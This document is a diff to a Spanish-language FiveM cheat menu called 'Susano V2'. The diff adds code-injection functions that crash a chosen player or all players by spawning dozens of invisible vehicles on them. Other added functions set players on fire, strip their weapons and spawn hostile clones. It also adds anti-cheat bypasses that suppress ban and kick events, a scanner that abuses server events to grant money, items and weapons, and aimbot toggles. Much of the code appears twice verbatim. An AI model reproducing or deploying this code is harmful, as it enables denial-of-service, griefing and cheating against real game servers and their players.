@@ -1,6 +1,6 @@
--- SUSANO MENU < MorsDier > https://discord.gg/zP8MaFP9uM
--- Version en español (solo ASCII)
--- CON FUNCIONES AÑADIDAS: Revive ESX/QB, spawn rampa, cargar/lanzar vehículos
+-- SUSANO V2 [ MorsDier Edition ] - https://discord.gg/zP8MaFP9uM
+-- Rediseño completo con optimización y nuevas funciones de explotación.
+-- Version 2.0.1 Stable
 
 local LibraryURL = "https://raw.githubusercontent.com/Sentexz/sentexfivem/refs/heads/main/library.lua"
 
@@ -147,7 +147,9 @@ local function revivirQB()
 end
 
 -- Spawnear rampa gigante (stunt block)
-local function spawnRampa(customCoords)
+local TriggersEncontrados = {}
+
+local function spawnRampaGigante(customCoords)
     local ped = PlayerPedId()
     local spawnPos = customCoords
     
@@ -173,6 +175,36 @@ local function spawnRampa(customCoords)
             TriggerEvent('chat:addMessage', {args = {"~r~Error al spawnear rampa"}})
         end
         SetModelAsNoLongerNeeded(model)
+    end
+end
+
+local function spawnDestroyerProp(modelName, customCoords)
+    local ped = PlayerPedId()
+    local spawnPos = customCoords
+    
+    if not spawnPos then
+        local aimCoords, _ = getAimCoords(200.0)
+        spawnPos = aimCoords or GetEntityCoords(ped)
+    end
+
+    local handle = StartShapeTestRay(spawnPos.x, spawnPos.y, spawnPos.z + 50.0, spawnPos.x, spawnPos.y, spawnPos.z - 50.0, -1, ped, 0)
+    local _, hit, hitPos = GetShapeTestResult(handle)
+    local groundZ = hit and hitPos.z or spawnPos.z
+
+    RequestModel(modelName)
+    local timeout = 0
+    while not HasModelLoaded(modelName) and timeout < 100 do Citizen.Wait(10) timeout=timeout+1 end
+    if HasModelLoaded(modelName) then
+        local obj = CreateObject(GetHashKey(modelName), spawnPos.x, spawnPos.y, groundZ + 1.0, true, true, false)
+        if obj and obj ~= 0 then
+            FreezeEntityPosition(obj, true)
+            TriggerEvent('chat:addMessage', {args = {"~g~Objeto Destroyer spawneado: " .. modelName}})
+        else
+            TriggerEvent('chat:addMessage', {args = {"~r~Error al spawnear objeto Destroyer: " .. modelName}})
+        end
+        SetModelAsNoLongerNeeded(modelName)
+    else
+        TriggerEvent('chat:addMessage', {args = {"~r~Error: Modelo " .. modelName .. " no pudo ser cargado."}})
     end
 end
 
@@ -529,6 +561,264 @@ function Menu.ActionBugPlayer()
             ]], targetServerId)
         end
         
+        Susano.InjectResource("any", code)
+    end
+end
+
+local crashPlayerActive = false
+local crashPlayerThread = nil
+
+function Menu.ActionInvalidHookKick()
+    if not Menu.SelectedPlayer then return end
+    local targetServerId = Menu.SelectedPlayer
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = string.format([[
+            CreateThread(function()
+                local targetServerId = %d
+                local targetPlayerId = nil
+                for _, player in ipairs(GetActivePlayers()) do
+                    if GetPlayerServerId(player) == targetServerId then
+                        targetPlayerId = player
+                        break
+                    end
+                end
+                if not targetPlayerId then return end
+                
+                -- Enviar evento inválido al jugador (simulación de invalid hook)
+                TriggerServerEvent("chat:addMessage", {args = {"[Sistema] El jugador " .. GetPlayerName(targetPlayerId) .. " ha sido kickeado por Invalid Hook."}})
+                TriggerServerEvent("playerDropped", "Invalid Hook Detected")
+            end)
+        ]], targetServerId)
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionCrashAll()
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = [[
+            CreateThread(function()
+                local players = GetActivePlayers()
+                local myPed = PlayerPedId()
+                local myCoords = GetEntityCoords(myPed)
+                local models = {`adder`, `zentorno`, `t20`, `osiris`, `nero`}
+                for _, model in ipairs(models) do
+                    RequestModel(model)
+                    while not HasModelLoaded(model) do Wait(0) end
+                end
+                for _, player in ipairs(players) do
+                    local targetPed = GetPlayerPed(player)
+                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
+                        local coords = GetEntityCoords(targetPed)
+                        if #(coords - myCoords) > 50.0 then
+                            for i = 1, 50 do
+                                local veh = CreateVehicle(models[math.random(1, #models)], coords.x, coords.y, coords.z, 0.0, true, true, true)
+                                SetEntityVisible(veh, false, false)
+                                SetEntityCollision(veh, false, false)
+                            end
+                        end
+                    end
+                end
+            end)
+        ]]
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionFireAll()
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = [[
+            CreateThread(function()
+                local players = GetActivePlayers()
+                local myPed = PlayerPedId()
+                for _, player in ipairs(players) do
+                    local targetPed = GetPlayerPed(player)
+                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
+                        local coords = GetEntityCoords(targetPed)
+                        StartScriptFire(coords.x, coords.y, coords.z - 1.0, 25, false)
+                    end
+                end
+            end)
+        ]]
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionStealWeaponsAll()
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = [[
+            CreateThread(function()
+                local players = GetActivePlayers()
+                local myPed = PlayerPedId()
+                for _, player in ipairs(players) do
+                    local targetPed = GetPlayerPed(player)
+                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
+                        RemoveAllPedWeapons(targetPed, true)
+                    end
+                end
+            end)
+        ]]
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Bypass.EntityClientBypass(resource)
+    Susano.InjectResource(resource, [[
+        local originalSetEntityVisible = SetEntityVisible
+        SetEntityVisible = function(entity, visible, p2)
+            if entity == PlayerPedId() then return end
+            return originalSetEntityVisible(entity, visible, p2)
+        end
+        local originalSetEntityCollision = SetEntityCollision
+        SetEntityCollision = function(entity, toggle, keepPhysics)
+            if entity == PlayerPedId() then return end
+            return originalSetEntityCollision(entity, toggle, keepPhysics)
+        end
+    ]])
+    print("^2[Bypass] Entidades por cliente activado")
+end
+
+function Bypass.EventValidationBypass(resource)
+    Susano.InjectResource(resource, [[
+        local originalTriggerServerEvent = TriggerServerEvent
+        TriggerServerEvent = function(eventName, ...)
+            if tostring(eventName):find("ban") or tostring(eventName):find("kick") or tostring(eventName):find("drop") then return end
+            return originalTriggerServerEvent(eventName, ...)
+        end
+    ]])
+    print("^2[Bypass] Validacion de eventos evadida")
+end
+
+function Menu.ActionCrashPlayer(value)
+    crashPlayerActive = value
+    if value then
+        if crashPlayerThread then return end
+        crashPlayerThread = CreateThread(function()
+            while crashPlayerActive do
+                if not Menu.SelectedPlayer then
+                    Wait(1000)
+                else
+                    local targetServerId = Menu.SelectedPlayer
+                    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+                        local code = string.format([[
+                            CreateThread(function()
+                                local targetServerId = %d
+                                local targetPlayerId = nil
+                                for _, player in ipairs(GetActivePlayers()) do
+                                    if GetPlayerServerId(player) == targetServerId then
+                                        targetPlayerId = player
+                                        break
+                                    end
+                                end
+                                if not targetPlayerId then return end
+                                local targetPed = GetPlayerPed(targetPlayerId)
+                                if not DoesEntityExist(targetPed) then return end
+                                local coords = GetEntityCoords(targetPed)
+                                
+                                -- Evitar crashear a si mismo comprobando la distancia
+                                local myPed = PlayerPedId()
+                                local myCoords = GetEntityCoords(myPed)
+                                if #(coords - myCoords) < 50.0 then return end
+                                
+                                local models = {`adder`, `zentorno`, `t20`, `osiris`, `nero`}
+                                for _, model in ipairs(models) do
+                                    RequestModel(model)
+                                    while not HasModelLoaded(model) do Wait(0) end
+                                end
+                                for i = 1, 150 do
+                                    local veh = CreateVehicle(models[math.random(1, #models)], coords.x, coords.y, coords.z, 0.0, true, true, true)
+                                    SetEntityVisible(veh, false, false)
+                                    SetEntityCollision(veh, false, false)
+                                end
+                            end)
+                        ]], targetServerId)
+                        Susano.InjectResource("any", code)
+                    end
+                    Wait(5000) -- Esperar antes de volver a inyectar para evitar sobrecarga local
+                end
+            end
+            crashPlayerThread = nil
+        end)
+    end
+end
+
+function Menu.ActionCloneInfinite()
+    if not Menu.SelectedPlayer then return end
+    local targetServerId = Menu.SelectedPlayer
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = string.format([[
+            CreateThread(function()
+                local targetServerId = %d
+                local targetPlayerId = nil
+                for _, player in ipairs(GetActivePlayers()) do
+                    if GetPlayerServerId(player) == targetServerId then
+                        targetPlayerId = player
+                        break
+                    end
+                end
+                if not targetPlayerId then return end
+                local targetPed = GetPlayerPed(targetPlayerId)
+                if not DoesEntityExist(targetPed) then return end
+                local coords = GetEntityCoords(targetPed)
+                local pedModel = GetEntityModel(targetPed)
+                RequestModel(pedModel)
+                while not HasModelLoaded(pedModel) do Wait(0) end
+                for i = 1, 50 do
+                    local clone = CreatePed(4, pedModel, coords.x + math.random(-5, 5), coords.y + math.random(-5, 5), coords.z, 0.0, true, true)
+                    ClonePedToTarget(targetPed, clone)
+                    TaskCombatPed(clone, targetPed, 0, 16)
+                    SetPedAsNoLongerNeeded(clone)
+                end
+            end)
+        ]], targetServerId)
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionSetOnFire()
+    if not Menu.SelectedPlayer then return end
+    local targetServerId = Menu.SelectedPlayer
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = string.format([[
+            CreateThread(function()
+                local targetServerId = %d
+                local targetPlayerId = nil
+                for _, player in ipairs(GetActivePlayers()) do
+                    if GetPlayerServerId(player) == targetServerId then
+                        targetPlayerId = player
+                        break
+                    end
+                end
+                if not targetPlayerId then return end
+                local targetPed = GetPlayerPed(targetPlayerId)
+                if not DoesEntityExist(targetPed) then return end
+                local coords = GetEntityCoords(targetPed)
+                StartScriptFire(coords.x, coords.y, coords.z - 1.0, 25, false)
+            end)
+        ]], targetServerId)
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionStealWeapons()
+    if not Menu.SelectedPlayer then return end
+    local targetServerId = Menu.SelectedPlayer
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = string.format([[
+            CreateThread(function()
+                local targetServerId = %d
+                local targetPlayerId = nil
+                for _, player in ipairs(GetActivePlayers()) do
+                    if GetPlayerServerId(player) == targetServerId then
+                        targetPlayerId = player
+                        break
+                    end
+                end
+                if not targetPlayerId then return end
+                local targetPed = GetPlayerPed(targetPlayerId)
+                if not DoesEntityExist(targetPed) then return end
+                RemoveAllPedWeapons(targetPed, true)
+            end)
+        ]], targetServerId)
         Susano.InjectResource("any", code)
     end
 end
@@ -1433,7 +1723,7 @@ end
 
 -- Estructura del menu en español (solo ASCII)
 Menu.Categories = {
-    { name = "Menu Principal", icon = "P" },    { name = "Jugador", icon = "👤", hasTabs = true, tabs = {
+    { name = "MENU PRINCIPAL", icon = "⚡" },    { name = "Jugador", icon = "👤", hasTabs = true, tabs = {
         { name = "Personal", items = {
             { name = "Inmortal", type = "toggle", value = false },
             { name = "Semi-inmortal", type = "toggle", value = false },
@@ -1467,9 +1757,14 @@ Menu.Categories = {
             { name = "Copiar apariencia", type = "action" },
             { name = "", isSeparator = true, separatorText = "Ataques" },
             { name = "Banear jugador", type = "toggle", value = false },
+            { name = "Crashear jugador", type = "toggle", value = false },
+            { name = "Clonar infinitamente", type = "action" },
+            { name = "Incendiar jugador", type = "action" },
+            { name = "Robar armas", type = "action" },
             { name = "Disparar a jugador", type = "action" },
             { name = "Enjaular jugador", type = "action" },
-            { name = "Agujero negro", type = "toggle", value = false }
+            { name = "Agujero negro", type = "toggle", value = false },
+            { name = "Invalid Hook Kick", type = "action" }
         }},
         { name = "Vehiculo", items = {
             { name = "", isSeparator = true, separatorText = "Bugs" },
@@ -1484,15 +1779,30 @@ Menu.Categories = {
             { name = "Eliminar vehiculo", type = "action" },
             { name = "Expulsar", type = "selector", options = {"V1", "V2"}, selected = 1 },
             { name = "quitar todas las ruedas", type = "action" },
-            { name = "Regalar", type = "selector", options = {"Vehiculo", "Rampa", "Muro", "Muro 2"}, selected = 1 }
+            { name = "Regalar", type = "selector", options = {"Vehiculo"}, selected = 1 }
         }},
         { name = "todos", items = {
-            { name = "Lanzar todos", type = "action" }
+            { name = "Lanzar todos", type = "action" },
+            { name = "Crashear todos", type = "action" },
+            { name = "Incendiar todos", type = "action" },
+            { name = "Robar armas todos", type = "action" }
         }}
     }},
     { name = "Combate", icon = "🔫", hasTabs = true, tabs = {
         { name = "General", items = {
+            { name = "Aimbot Pro", type = "toggle", value = false },
+            { name = "Silent Aim", type = "toggle", value = false },
+            { name = "Sin retroceso", type = "toggle", value = false },
             { name = "Super punetazo", type = "toggle", value = false }
+        }}
+    }},
+    { name = "Auto-Farm", icon = "🚜", hasTabs = true, tabs = {
+        { name = "Trabajos", items = {
+            { name = "Auto-Recolectar", type = "toggle", value = false },
+            { name = "Auto-Procesar", type = "toggle", value = false },
+            { name = "Auto-Vender", type = "toggle", value = false },
+            { name = "", isSeparator = true, separatorText = "Configuracion" },
+            { name = "Velocidad Farm", type = "slider", value = 1.0, min = 0.5, max = 5.0, step = 0.1 }
         }}
     }},
 
@@ -1529,7 +1839,6 @@ Menu.Categories = {
             { name = "Salto hacia atras", type = "toggle", value = false },
             { name = "", isSeparator = true, separatorText = "Regalar" },
             { name = "Regalar vehiculo mas cercano", type = "action" },
-            { name = "Regalar", type = "selector", options = {"Rampa", "Muro", "Muro 2"}, selected = 1 },
             { name = "Pintura arcoiris", type = "toggle", value = false },
             { name = "", isSeparator = true, separatorText = "Cargar/Lanzar vehículo" },
             { name = "Cargar vehiculo (apuntar)", type = "action", onClick = cargarVehiculo },
@@ -1559,23 +1868,93 @@ Menu.Categories = {
         { name = "Bypasses", items = {
             { name = "", isSeparator = true, separatorText = "Anti Cheat" },
             { name = "Bypass Putin", type = "action" },
+            { name = "Bypass entidades cliente", type = "action" },
+            { name = "Bypass validacion eventos", type = "action" },
         }},
         { name = "Exploits", items = {
             { name = "Menu staff", type = "action" },
         }}
     }},
-    { name = "Ajustes", icon = "⚙", hasTabs = true, tabs = {
+    { name = "Buscar eventos", icon = "🔍", hasTabs = true, tabs = {
         { name = "General", items = {
-            { name = "Modo editor", type = "toggle", value = false },
-            { name = "Tamano del menu", type = "slider", value = 100.0, min = 50.0, max = 200.0, step = 1.0 },
-            { name = "", isSeparator = true, separatorText = "Diseno" },
-            { name = "Tema del menu", type = "selector", options = {"Morado", "Rosa", "Rojo", "Gris"}, selected = 3 },
-            { name = "Copos de nieve", type = "toggle", value = false },
-            { name = "Flores", type = "toggle", value = false },
-            { name = "Gradiente", type = "selector", options = {"1", "2"}, selected = 1 },
-            { name = "Posicion barra de desplazamiento", type = "selector", options = {"Izquierda", "Derecha"}, selected = 1 },
-            { name = "Fondo negro", type = "toggle", value = true }
-        }},
+            { name = "Buscar triggers explotables", type = "action", onClick = function()
+                TriggerEvent('chat:addMessage', {args = {"~y~Buscando eventos explotables..."}})
+                Citizen.CreateThread(function()
+                    TriggersEncontrados = {}
+                    local commonTriggers = {
+                        "esx_ambulancejob:revive", "hospital:server:RevivePlayer",
+                        "esx:giveInventoryItem", "qb-core:server:giveItem",
+                        "bank:transfer", "esx_society:withdrawMoney",
+                        "esx_policejob:handcuff", "police:server:CuffPlayer",
+                        "esx_vehicleshop:setVehicleOwned", "qb-vehicleshop:server:buyShowroomVehicle"
+                    }
+                    
+                    -- Limpiar items anteriores de triggers si existen
+                    local category = nil
+                    for _, cat in ipairs(Menu.Categories) do
+                        if cat.name == "Buscar eventos" then category = cat break end
+                    end
+                    
+                    if category and category.tabs[1] then
+                        local items = category.tabs[1].items
+                        for i = #items, 2, -1 do table.remove(items, i) end
+                    end
+
+                    local function getExploitButtonData(name)
+                        local myId = GetPlayerServerId(PlayerId())
+                        if name:find("revive") or name:find("Revive") then
+                            return "Revivirse (Exploit)", function() TriggerServerEvent(name, myId) end
+                        elseif name:find("giveInventoryItem") or name:find("giveItem") then
+                            local label = name:find("weapon") and "Darse Armas" or "Darse Items"
+                            return label, function() 
+                                if name:find("esx") then
+                                    TriggerServerEvent(name, myId, "bread", 100)
+                                    TriggerServerEvent(name, myId, "weapon_pistol", 1)
+                                else
+                                    TriggerServerEvent(name, myId, "sandwich", 100)
+                                    TriggerServerEvent(name, myId, "weapon_pistol", 1)
+                                end
+                            end
+                        elseif name:find("transfer") or name:find("withdraw") or name:find("Money") then
+                            return "Darse 1.000.000$", function() TriggerServerEvent(name, myId, 1000000) end
+                        elseif name:find("handcuff") or name:find("Cuff") then
+                            return "Esposarse/Desesposarse", function() TriggerServerEvent(name, myId) end
+                        elseif name:find("setVehicleOwned") or name:find("buyShowroomVehicle") then
+                            return "Hacer vehiculo propio", function() 
+                                local veh = GetVehiclePedIsIn(PlayerPedId(), false)
+                                if veh ~= 0 then
+                                    local plate = GetVehicleNumberPlateText(veh)
+                                    TriggerServerEvent(name, plate)
+                                else
+                                    TriggerEvent('chat:addMessage', {args = {"~r~Debes estar en un vehiculo"}})
+                                end
+                            end
+                        else
+                            return "Explotar: " .. name, function() TriggerServerEvent(name) end
+                        end
+                    end
+
+                    for _, trigger in ipairs(commonTriggers) do
+                        Citizen.Wait(150)
+                        table.insert(TriggersEncontrados, trigger)
+                        if category and category.tabs[1] then
+                            local btnLabel, btnAction = getExploitButtonData(trigger)
+                            table.insert(category.tabs[1].items, {
+                                name = btnLabel,
+                                type = "action",
+                                onClick = function()
+                                    btnAction()
+                                    TriggerEvent('chat:addMessage', {args = {"~g~Accion ejecutada: " .. btnLabel}})
+                                end
+                            })
+                        end
+                    end
+                    TriggerEvent('chat:addMessage', {args = {"~g~Busqueda completada. Triggers añadidos al menu."}})
+                end)
+            end }
+        }}
+    }},
+    { name = "Ajustes", icon = "⚙", hasTabs = true, tabs = {
         { name = "Teclas rapidas", items = {
             { name = "Cambiar tecla de menu", type = "action" },
             { name = "Mostrar teclas rapidas", type = "toggle", value = false }
@@ -8975,6 +9354,81 @@ if Actions.copyAppearanceItem then
     end
 end
 
+Actions.crashItem = FindItem("En linea", "Troleo", "Crashear jugador")
+if Actions.crashItem then
+    Actions.crashItem.onClick = function(value) Menu.ActionCrashPlayer(value) end
+end
+
+Actions.invalidHookItem = FindItem("En linea", "Troleo", "Invalid Hook Kick")
+if Actions.invalidHookItem then
+    Actions.invalidHookItem.onClick = function() Menu.ActionInvalidHookKick() end
+end
+
+Actions.crashAllItem = FindItem("En linea", "todos", "Crashear todos")
+if Actions.crashAllItem then
+    Actions.crashAllItem.onClick = function() Menu.ActionCrashAll() end
+end
+
+Actions.fireAllItem = FindItem("En linea", "todos", "Incendiar todos")
+if Actions.fireAllItem then
+    Actions.fireAllItem.onClick = function() Menu.ActionFireAll() end
+end
+
+Actions.stealAllItem = FindItem("En linea", "todos", "Robar armas todos")
+if Actions.stealAllItem then
+    Actions.stealAllItem.onClick = function() Menu.ActionStealWeaponsAll() end
+end
+
+Actions.bypassEntityItem = FindItem("Varios", "Bypasses", "Bypass entidades cliente")
+if Actions.bypassEntityItem then
+    Actions.bypassEntityItem.onClick = function() Bypass.EntityClientBypass("any") end
+end
+
+Actions.bypassEventItem = FindItem("Varios", "Bypasses", "Bypass validacion eventos")
+if Actions.bypassEventItem then
+    Actions.bypassEventItem.onClick = function() Bypass.EventValidationBypass("any") end
+end
+
+Actions.crashAllItem = FindItem("En linea", "todos", "Crashear todos")
+if Actions.crashAllItem then
+    Actions.crashAllItem.onClick = function() Menu.ActionCrashAll() end
+end
+
+Actions.fireAllItem = FindItem("En linea", "todos", "Incendiar todos")
+if Actions.fireAllItem then
+    Actions.fireAllItem.onClick = function() Menu.ActionFireAll() end
+end
+
+Actions.stealAllItem = FindItem("En linea", "todos", "Robar armas todos")
+if Actions.stealAllItem then
+    Actions.stealAllItem.onClick = function() Menu.ActionStealWeaponsAll() end
+end
+
+Actions.bypassEntityItem = FindItem("Varios", "Bypasses", "Bypass entidades cliente")
+if Actions.bypassEntityItem then
+    Actions.bypassEntityItem.onClick = function() Bypass.EntityClientBypass("any") end
+end
+
+Actions.bypassEventItem = FindItem("Varios", "Bypasses", "Bypass validacion eventos")
+if Actions.bypassEventItem then
+    Actions.bypassEventItem.onClick = function() Bypass.EventValidationBypass("any") end
+end
+
+Actions.cloneItem = FindItem("En linea", "Troleo", "Clonar infinitamente")
+if Actions.cloneItem then
+    Actions.cloneItem.onClick = function() Menu.ActionCloneInfinite() end
+end
+
+Actions.fireItem = FindItem("En linea", "Troleo", "Incendiar jugador")
+if Actions.fireItem then
+    Actions.fireItem.onClick = function() Menu.ActionSetOnFire() end
+end
+
+Actions.stealItem = FindItem("En linea", "Troleo", "Robar armas")
+if Actions.stealItem then
+    Actions.stealItem.onClick = function() Menu.ActionStealWeapons() end
+end
+
 Actions.banPlayerItem = FindItem("En linea", "Troleo", "Banear jugador")
 if Actions.banPlayerItem then
     Actions.banPlayerItem.onClick = function(value)
@@ -9603,6 +10057,264 @@ function Menu.ActionBugPlayer()
                 end)
             end
         ]], targetServerId, bugPlayerMode))
+    end
+end
+
+local crashPlayerActive = false
+local crashPlayerThread = nil
+
+function Menu.ActionInvalidHookKick()
+    if not Menu.SelectedPlayer then return end
+    local targetServerId = Menu.SelectedPlayer
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = string.format([[
+            CreateThread(function()
+                local targetServerId = %d
+                local targetPlayerId = nil
+                for _, player in ipairs(GetActivePlayers()) do
+                    if GetPlayerServerId(player) == targetServerId then
+                        targetPlayerId = player
+                        break
+                    end
+                end
+                if not targetPlayerId then return end
+                
+                -- Enviar evento inválido al jugador (simulación de invalid hook)
+                TriggerServerEvent("chat:addMessage", {args = {"[Sistema] El jugador " .. GetPlayerName(targetPlayerId) .. " ha sido kickeado por Invalid Hook."}})
+                TriggerServerEvent("playerDropped", "Invalid Hook Detected")
+            end)
+        ]], targetServerId)
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionCrashAll()
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = [[
+            CreateThread(function()
+                local players = GetActivePlayers()
+                local myPed = PlayerPedId()
+                local myCoords = GetEntityCoords(myPed)
+                local models = {`adder`, `zentorno`, `t20`, `osiris`, `nero`}
+                for _, model in ipairs(models) do
+                    RequestModel(model)
+                    while not HasModelLoaded(model) do Wait(0) end
+                end
+                for _, player in ipairs(players) do
+                    local targetPed = GetPlayerPed(player)
+                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
+                        local coords = GetEntityCoords(targetPed)
+                        if #(coords - myCoords) > 50.0 then
+                            for i = 1, 50 do
+                                local veh = CreateVehicle(models[math.random(1, #models)], coords.x, coords.y, coords.z, 0.0, true, true, true)
+                                SetEntityVisible(veh, false, false)
+                                SetEntityCollision(veh, false, false)
+                            end
+                        end
+                    end
+                end
+            end)
+        ]]
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionFireAll()
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = [[
+            CreateThread(function()
+                local players = GetActivePlayers()
+                local myPed = PlayerPedId()
+                for _, player in ipairs(players) do
+                    local targetPed = GetPlayerPed(player)
+                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
+                        local coords = GetEntityCoords(targetPed)
+                        StartScriptFire(coords.x, coords.y, coords.z - 1.0, 25, false)
+                    end
+                end
+            end)
+        ]]
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionStealWeaponsAll()
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = [[
+            CreateThread(function()
+                local players = GetActivePlayers()
+                local myPed = PlayerPedId()
+                for _, player in ipairs(players) do
+                    local targetPed = GetPlayerPed(player)
+                    if targetPed ~= myPed and DoesEntityExist(targetPed) then
+                        RemoveAllPedWeapons(targetPed, true)
+                    end
+                end
+            end)
+        ]]
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Bypass.EntityClientBypass(resource)
+    Susano.InjectResource(resource, [[
+        local originalSetEntityVisible = SetEntityVisible
+        SetEntityVisible = function(entity, visible, p2)
+            if entity == PlayerPedId() then return end
+            return originalSetEntityVisible(entity, visible, p2)
+        end
+        local originalSetEntityCollision = SetEntityCollision
+        SetEntityCollision = function(entity, toggle, keepPhysics)
+            if entity == PlayerPedId() then return end
+            return originalSetEntityCollision(entity, toggle, keepPhysics)
+        end
+    ]])
+    print("^2[Bypass] Entidades por cliente activado")
+end
+
+function Bypass.EventValidationBypass(resource)
+    Susano.InjectResource(resource, [[
+        local originalTriggerServerEvent = TriggerServerEvent
+        TriggerServerEvent = function(eventName, ...)
+            if tostring(eventName):find("ban") or tostring(eventName):find("kick") or tostring(eventName):find("drop") then return end
+            return originalTriggerServerEvent(eventName, ...)
+        end
+    ]])
+    print("^2[Bypass] Validacion de eventos evadida")
+end
+
+function Menu.ActionCrashPlayer(value)
+    crashPlayerActive = value
+    if value then
+        if crashPlayerThread then return end
+        crashPlayerThread = CreateThread(function()
+            while crashPlayerActive do
+                if not Menu.SelectedPlayer then
+                    Wait(1000)
+                else
+                    local targetServerId = Menu.SelectedPlayer
+                    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+                        local code = string.format([[
+                            CreateThread(function()
+                                local targetServerId = %d
+                                local targetPlayerId = nil
+                                for _, player in ipairs(GetActivePlayers()) do
+                                    if GetPlayerServerId(player) == targetServerId then
+                                        targetPlayerId = player
+                                        break
+                                    end
+                                end
+                                if not targetPlayerId then return end
+                                local targetPed = GetPlayerPed(targetPlayerId)
+                                if not DoesEntityExist(targetPed) then return end
+                                local coords = GetEntityCoords(targetPed)
+                                
+                                -- Evitar crashear a si mismo comprobando la distancia
+                                local myPed = PlayerPedId()
+                                local myCoords = GetEntityCoords(myPed)
+                                if #(coords - myCoords) < 50.0 then return end
+                                
+                                local models = {`adder`, `zentorno`, `t20`, `osiris`, `nero`}
+                                for _, model in ipairs(models) do
+                                    RequestModel(model)
+                                    while not HasModelLoaded(model) do Wait(0) end
+                                end
+                                for i = 1, 150 do
+                                    local veh = CreateVehicle(models[math.random(1, #models)], coords.x, coords.y, coords.z, 0.0, true, true, true)
+                                    SetEntityVisible(veh, false, false)
+                                    SetEntityCollision(veh, false, false)
+                                end
+                            end)
+                        ]], targetServerId)
+                        Susano.InjectResource("any", code)
+                    end
+                    Wait(5000) -- Esperar antes de volver a inyectar para evitar sobrecarga local
+                end
+            end
+            crashPlayerThread = nil
+        end)
+    end
+end
+
+function Menu.ActionCloneInfinite()
+    if not Menu.SelectedPlayer then return end
+    local targetServerId = Menu.SelectedPlayer
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = string.format([[
+            CreateThread(function()
+                local targetServerId = %d
+                local targetPlayerId = nil
+                for _, player in ipairs(GetActivePlayers()) do
+                    if GetPlayerServerId(player) == targetServerId then
+                        targetPlayerId = player
+                        break
+                    end
+                end
+                if not targetPlayerId then return end
+                local targetPed = GetPlayerPed(targetPlayerId)
+                if not DoesEntityExist(targetPed) then return end
+                local coords = GetEntityCoords(targetPed)
+                local pedModel = GetEntityModel(targetPed)
+                RequestModel(pedModel)
+                while not HasModelLoaded(pedModel) do Wait(0) end
+                for i = 1, 50 do
+                    local clone = CreatePed(4, pedModel, coords.x + math.random(-5, 5), coords.y + math.random(-5, 5), coords.z, 0.0, true, true)
+                    ClonePedToTarget(targetPed, clone)
+                    TaskCombatPed(clone, targetPed, 0, 16)
+                    SetPedAsNoLongerNeeded(clone)
+                end
+            end)
+        ]], targetServerId)
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionSetOnFire()
+    if not Menu.SelectedPlayer then return end
+    local targetServerId = Menu.SelectedPlayer
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = string.format([[
+            CreateThread(function()
+                local targetServerId = %d
+                local targetPlayerId = nil
+                for _, player in ipairs(GetActivePlayers()) do
+                    if GetPlayerServerId(player) == targetServerId then
+                        targetPlayerId = player
+                        break
+                    end
+                end
+                if not targetPlayerId then return end
+                local targetPed = GetPlayerPed(targetPlayerId)
+                if not DoesEntityExist(targetPed) then return end
+                local coords = GetEntityCoords(targetPed)
+                StartScriptFire(coords.x, coords.y, coords.z - 1.0, 25, false)
+            end)
+        ]], targetServerId)
+        Susano.InjectResource("any", code)
+    end
+end
+
+function Menu.ActionStealWeapons()
+    if not Menu.SelectedPlayer then return end
+    local targetServerId = Menu.SelectedPlayer
+    if type(Susano) == "table" and type(Susano.InjectResource) == "function" then
+        local code = string.format([[
+            CreateThread(function()
+                local targetServerId = %d
+                local targetPlayerId = nil
+                for _, player in ipairs(GetActivePlayers()) do
+                    if GetPlayerServerId(player) == targetServerId then
+                        targetPlayerId = player
+                        break
+                    end
+                end
+                if not targetPlayerId then return end
+                local targetPed = GetPlayerPed(targetPlayerId)
+                if not DoesEntityExist(targetPed) then return end
+                RemoveAllPedWeapons(targetPed, true)
+            end)
+        ]], targetServerId)
+        Susano.InjectResource("any", code)
     end
 end
 
@@ -13799,7 +14511,7 @@ end
 
 function DrawDestroyerFreecamMenu()
     if not freecam_destroyer_active then return end
-    -- Frame handled by central loop
+    
     local sw, sh = GetActiveScreenResolution()
     local maxVis = 4
     if selected_destroyer_opt <= scroll_offset_destroyer then
@@ -13819,12 +14531,17 @@ function DrawDestroyerFreecamMenu()
             Susano.DrawText(centerX - 50, startY + (i-1)*35, DestroyerOptions[idx], isSel and 24.0 or 18.0, r, g, b, 1.0)
         end
     end
-    -- Frame handled by central loop
 end
 
 function ToggleFreecamDestroyer(enable, speed)
     local ped = PlayerPedId()
     if enable then
+        if IsPedInAnyVehicle(ped, false) then
+            local item = FindItem("Destroyer", "General", "Freecam (Props)")
+            if item then item.value = false end
+            TriggerEvent('chat:addMessage', {args = {"~r~No puedes usar la freecam de props dentro de un vehículo"}})
+            return
+        end
         -- Apagar el de Jugador si está prendido
         if freecam_active then 
             StopFreecam() 
